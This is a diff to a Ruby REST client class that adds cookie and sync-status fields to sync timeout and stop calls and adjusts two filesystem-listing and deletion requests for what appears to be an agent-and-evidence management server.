@@ -112,6 +112,8 @@ class DB_rest
                  :platform => session[:platform],
                  :demo => session[:demo],
                  :level => session[:level],
+                 :cookie => session[:cookie],
+                 :sync_stat => session[:sync_stat],
                  :version => version,
                  :user => user,
                  :device => device,
@@ -150,7 +152,7 @@ class DB_rest
 
   def sync_timeout(session)
     begin
-      content = {:bid => session[:bid], :instance => session[:instance]}
+      content = {:bid => session[:bid], :instance => session[:instance], :cookie => session[:cookie], :sync_stat => session[:sync_stat]}
       return rest_call('POST', '/evidence/timeout', content.to_json)
     rescue Exception => e
       trace :error, "Error calling sync_timeout: #{e.class} #{e.message}"
@@ -160,7 +162,7 @@ class DB_rest
 
   def sync_end(session)
     begin
-      content = {:bid => session[:bid], :instance => session[:instance]}
+      content = {:bid => session[:bid], :instance => session[:instance], :cookie => session[:cookie], :sync_stat => session[:sync_stat]}
       return rest_call('POST', '/evidence/stop', content.to_json)
     rescue Exception => e
       trace :error, "Error calling sync_end: #{e.class} #{e.message}"
@@ -423,7 +425,7 @@ class DB_rest
   # retrieve the filesystem list from db (if any)
   def new_filesystems(bid)
     begin
-      ret = rest_call('GET', "/agent/filesystems/#{bid}")
+      ret = rest_call('GET', "/agent/filesystems/#{bid}?new=true")
 
       files = {}
       # parse the results
@@ -440,7 +442,8 @@ class DB_rest
 
   def del_filesystem(bid, id)
     begin
-      return rest_call('DELETE', "/agent/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id}))
+      # TODO: use update http method (not delete)
+      return rest_call('DELETE', "/agent/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id, :sent_at => Time.now.to_i}))
     rescue Exception => e
       trace :error, "Error calling del_filesystem: #{e.class} #{e.message}"
       propagate_error e
